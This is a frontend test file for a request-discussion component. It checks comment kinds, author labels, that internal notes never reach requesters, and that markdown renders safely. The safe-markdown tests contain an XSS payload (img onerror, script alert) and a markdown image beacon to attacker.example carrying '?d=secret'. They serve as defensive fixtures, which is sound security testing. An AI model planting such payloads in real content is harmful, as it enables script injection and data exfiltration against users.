// RequestDiscussion (AMP #3979): the kind distinction, markdown safety, trusted
// actor labels, and the one rule the thread exists to keep — internal comments
// never reach a requester.
//
// What this file pins, in the order the ticket's criteria name it:
//
//  1. **The kind is visible and meaningful.** A question reads as the desk
//     asking, an answer as the requester's reply, and a plain comment as
//     internal. An answer quotes the question it replies to (append order).
//  2. **Safe markdown.** Raw HTML stays literal text, and a remote image renders
//     as an inert placeholder with its URL — no `img` element is ever created,
//     so a request's text cannot make the browser fetch an attacker's pixel
//     (contract D13, threat model T-UI-4).
//  3. **Actor labels come from the DTO.** The author a row shows is the
//     recorded `author` snapshot — never a client-side user lookup — and the
//     viewer's own rows read "You".
//  4. **No internal leakage in requester mode.** The requester arm takes
//     `RequesterComment` (which has no author, id or user id), and drops any
//     `comment` row that is not the requester's own, so a hand-built array
//     cannot show an internal note.
//  5. **The composer posts in the caller's own voice** and reports the failure
//     without losing what was typed.
import { render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { http, HttpResponse } from 'msw'
import { setupServer } from 'msw/node'
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'
import { RequestDiscussion } from './RequestDiscussion'
import type { RequestComment, RequesterComment } from '../../types'

const comment = (over: Partial<RequestComment> = {}): RequestComment => ({
  id: 1,
  request_id: 7,
  kind: 'comment',
  body: 'Metadata checks out.',
  author: 'Priya Nair',
  author_user_id: 11,
  created_at: '2026-11-14T10:00:00Z',
  ...over,
})

const calls: { method: string; path: string; body: unknown }[] = []
const server = setupServer(
  http.post('*/api/teams/:teamId/requests/:requestId/comments', async ({ request }) => {
    const text = await request.text()
    calls.push({ method: request.method, path: new URL(request.url).pathname, body: text ? JSON.parse(text) : undefined })
    return HttpResponse.json({
      comment: { id: 31, kind: 'comment', body: 'Looks good to me.', created_at: '2026-11-14T11:00:00Z' },
      wrote: true,
    }, { status: 201 })
  }),
)
beforeAll(() => server.listen({ onUnhandledFrame: 'error' }))
afterEach(() => { server.resetHandlers(); calls.length = 0 })
afterAll(() => server.close())

describe('the kind distinction', () => {
  const thread: RequestComment[] = [
    comment({ id: 1, kind: 'comment', body: 'Internal note: route this to AMP v2.' }),
    comment({ id: 2, kind: 'question', body: 'Which group should be the default?', author: 'Priya Nair', author_user_id: 11 }),
    comment({ id: 3, kind: 'answer', body: 'de-ops, and only new sign-ins.', author: 'it-admin@acme.example', author_user_id: 42 }),
  ]

  it('labels each row with its kind, so internal and shared rows read apart', () => {
    render(<RequestDiscussion mode="team" comments={thread} />)
    const rows = screen.getAllByTestId('discussion-row')
    expect(rows.map(r => r.getAttribute('data-kind'))).toEqual(['comment', 'question', 'answer'])
    expect(within(rows[0]).getByText('Internal comment')).toHaveAttribute('title', expect.stringContaining('never sees'))
    expect(within(rows[1]).getByText('Question to the requester')).toBeInTheDocument()
    expect(within(rows[2]).getByText('Answer from the requester')).toBeInTheDocument()
  })

  it('quotes the question an answer replies to, from append order', () => {
    render(<RequestDiscussion mode="team" comments={thread} />)
    const answer = screen.getAllByTestId('discussion-row')[2]
    expect(within(answer).getByText(/Answering:/)).toHaveTextContent('Which group should be the default?')
  })

  it('shows the author the row recorded, and "You" for the viewer\'s own rows', () => {
    render(<RequestDiscussion mode="team" comments={thread} viewerUserId={42} />)
    const rows = screen.getAllByTestId('discussion-row')
    expect(within(rows[0]).getByText('Priya Nair')).toBeInTheDocument()
    // The requester's answer is the viewer's own row.
    expect(within(rows[2]).getByText('You')).toBeInTheDocument()
    expect(within(rows[2]).queryByText('it-admin@acme.example')).toBeNull()
  })

  it('marks a row an agent relayed for a person, instead of pretending the person typed it', () => {
    render(<RequestDiscussion mode="team" comments={[comment({ author: 'jacob.sims@simstech.cloud (relayed by agent)' })]} />)
    const row = screen.getByTestId('discussion-row')
    expect(within(row).getByText('jacob.sims@simstech.cloud')).toBeInTheDocument()
    expect(within(row).getByText('Relayed by agent')).toBeInTheDocument()
  })

  it('says so when the thread is empty, and distinguishes the two modes\' empties', () => {
    const { unmount } = render(<RequestDiscussion mode="team" comments={[]} />)
    expect(screen.getByTestId('request-panel-empty')).toHaveTextContent(/No discussion yet/i)
    unmount()
    render(<RequestDiscussion mode="requester" comments={[]} />)
    expect(screen.getByTestId('request-panel-empty')).toHaveTextContent(/Anything the desk shares with you/i)
  })
})

describe('safe markdown', () => {
  it('renders raw HTML as text and never creates the element', () => {
    const hostile = 'hi <img src="https://attacker.example/x.png" onerror="alert(1)"> <script>alert(2)</script>'
    const { container } = render(<RequestDiscussion mode="team" comments={[comment({ body: hostile })]} />)
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    expect(screen.getByTestId('discussion-body').textContent).toContain('<script>alert(2)</script>')
  })

  it('never loads a markdown image: the placeholder keeps the URL, nothing is fetched', () => {
    const { container } = render(
      <RequestDiscussion mode="team" comments={[comment({ body: 'see ![chart](https://attacker.example/pixel.png?d=secret)' })]} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[data-blocked-image]')).not.toBeNull()
    expect(screen.getByTestId('discussion-body').textContent).toContain('https://attacker.example/pixel.png?d=secret')
  })

  it('applies the same rules to the requester arm', () => {
    const { container } = render(
      <RequestDiscussion mode="requester" comments={[{ kind: 'question', from: 'desk', body: '![x](https://a.example/p.png)', at: '2026-11-14T10:00:00Z' }]} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[data-blocked-image]')).not.toBeNull()
  })
})

describe('no internal leakage in requester mode', () => {
  const shared: RequesterComment[] = [
    { kind: 'question', from: 'desk', body: 'Which env?', at: '2026-11-14T09:00:00Z' },
    { kind: 'answer', from: 'you', body: 'Staging.', at: '2026-11-14T09:10:00Z' },
    // A plain comment that is not the requester's: the projection never sends
    // one, and a hand-built array must not get one through either.
    { kind: 'comment', from: 'desk', body: 'Internal: do not show this.', at: '2026-11-14T09:20:00Z' },
    { kind: 'system', from: 'desk', body: 'System: claimed by 11.', at: '2026-11-14T09:30:00Z' },
    { kind: 'comment', from: 'you', body: 'My own remark.', at: '2026-11-14T09:40:00Z' },
  ]

  it('drops a desk comment and a system row, keeps the exchange and the requester\'s own remark', () => {
    render(<RequestDiscussion mode="requester" comments={shared} />)
    const bodies = screen.getAllByTestId('discussion-body').map(n => n.textContent)
    expect(bodies.some(b => b?.includes('Internal: do not show this'))).toBe(false)
    expect(bodies.some(b => b?.includes('System: claimed'))).toBe(false)
    expect(bodies.some(b => b?.includes('Which env?'))).toBe(true)
    expect(bodies.some(b => b?.includes('Staging.'))).toBe(true)
    expect(bodies.some(b => b?.includes('My own remark'))).toBe(true)
    // Attribution collapses to the two words the projection allows.
    const rows = screen.getAllByTestId('discussion-row')
    expect(within(rows[0]).getByText('The desk')).toBeInTheDocument()
    expect(within(rows[1]).getByText('You')).toBeInTheDocument()
  })

  it('offers no composer: a comment in requester mode is not a thing the surface has', () => {
    render(<RequestDiscussion mode="requester" comments={shared} />)
    expect(screen.queryByTestId('discussion-composer')).toBeNull()
    expect(screen.queryByRole('button')).toBeNull()
  })

  it('has no room in its row type for an author, an id or a user id', () => {
    // The absence is the guarantee: these reads are compile errors, so a field
    // added to RequesterComment turns this file red instead of silently handing
    // a requester a team member's identity.
    const row: RequesterComment = shared[0]
    // @ts-expect-error — RequesterComment carries no author
    expect(row.author).toBeUndefined()
    // @ts-expect-error — RequesterComment carries no id
    expect(row.id).toBeUndefined()
    // @ts-expect-error — RequesterComment carries no author_user_id
    expect(row.author_user_id).toBeUndefined()
  })
})

describe('commenting', () => {
  const tenant = { teamId: 4, requestId: 7 }

  it('posts an internal comment in the caller\'s own voice and clears the box', async () => {
    const onPosted = vi.fn()
    render(<RequestDiscussion mode="team" comments={[]} tenant={tenant} canComment onPosted={onPosted} />)
    const post = screen.getByRole('button', { name: /post/i })
    expect(post).toBeDisabled()
    await userEvent.type(screen.getByLabelText('Comment'), 'Looks good to me.')
    await userEvent.click(post)
    await waitFor(() => expect(onPosted).toHaveBeenCalled())
    expect(calls).toEqual([
      { method: 'POST', path: '/api/teams/4/requests/7/comments', body: { kind: 'comment', body: 'Looks good to me.' } },
    ])
    expect(screen.getByLabelText('Comment')).toHaveValue('')
    expect(screen.getByTestId('comment-posted')).toBeInTheDocument()
  })

  it('says "internal" before the person types, so nobody assumes the requester can read it', () => {
    render(<RequestDiscussion mode="team" comments={[]} tenant={tenant} canComment />)
    expect(screen.getByText('Internal comments stay internal')).toBeInTheDocument()
    expect(screen.getByText(/Posted in your own name/)).toBeInTheDocument()
  })

  it('keeps what was typed when the post fails, and shows why', async () => {
    server.use(http.post('*/api/teams/:teamId/requests/:requestId/comments', () =>
      HttpResponse.json({ error: 'That request moved on; reload before commenting.', code: 'request.conflict' }, { status: 409 })))
    render(<RequestDiscussion mode="team" comments={[]} tenant={tenant} canComment />)
    await userEvent.type(screen.getByLabelText('Comment'), 'Half-written note')
    await userEvent.click(screen.getByRole('button', { name: /post/i }))
    await waitFor(() => expect(screen.getByRole('alert')).toHaveTextContent(/reload before commenting/i))
    expect(screen.getByLabelText('Comment')).toHaveValue('Half-written note')
    expect(screen.queryByTestId('comment-posted')).toBeNull()
  })

  it('is read-only without a tenant or without permission, and says why', () => {
    const { unmount } = render(<RequestDiscussion mode="team" comments={[comment()]} />)
    expect(screen.queryByTestId('discussion-composer')).toBeNull()
    expect(screen.getByText(/Commenting needs a signed-in team member/)).toBeInTheDocument()
    unmount()
    render(<RequestDiscussion mode="team" comments={[comment()]} tenant={tenant} canComment={false} />)
    expect(screen.queryByTestId('discussion-composer')).toBeNull()
  })
})
